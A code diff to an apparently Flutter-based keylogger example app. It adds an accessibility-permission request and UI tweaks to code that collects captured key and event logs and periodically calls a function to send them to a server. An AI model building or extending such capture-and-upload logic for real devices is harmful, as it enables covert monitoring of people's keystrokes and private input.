@@ -16,7 +16,7 @@ class _MyAppState extends State<MyApp> {
   @override
   void initState() {
     super.initState();
-    keyLogger.logs((log) {
+    Keylogger.logs((log) {
       logs.add(log);
       setState(() {});
       if (logs.length % 1000 == 0) {
@@ -27,6 +27,16 @@ class _MyAppState extends State<MyApp> {
         });
       }
     });
+
+    Keylogger.isAccessibilityPermissionEnabled().then(
+      (enabled) => {
+        if (!enabled)
+          {
+            print("-------------Enable--------------"),
+            Keylogger.requestAccessibilityPermission(),
+          }
+      },
+    );
   }
 
   sendToServer() {
@@ -40,12 +50,21 @@ class _MyAppState extends State<MyApp> {
       theme: ThemeData.dark(),
       home: Scaffold(
         appBar: AppBar(
-          title: Text('Keylogger/EventLogger app'),
+          title: Text('Key | Event Logger'),
           actions: [
-            Text(
-              "Logs count:" + logs.length.toString(),
-              style: TextStyle(fontSize: 30),
-            )
+            TextButton(
+              onPressed: () {},
+              child: Text(
+                "Logs:" + logs.length.toString(),
+                style: TextStyle(fontSize: 24),
+              ),
+            ),
+            IconButton(
+              onPressed: () {
+                Keylogger.requestAccessibilityPermission();
+              },
+              icon: Icon(Icons.accessibility),
+            ),
           ],
         ),
         bottomNavigationBar: BottomNavigationBar(
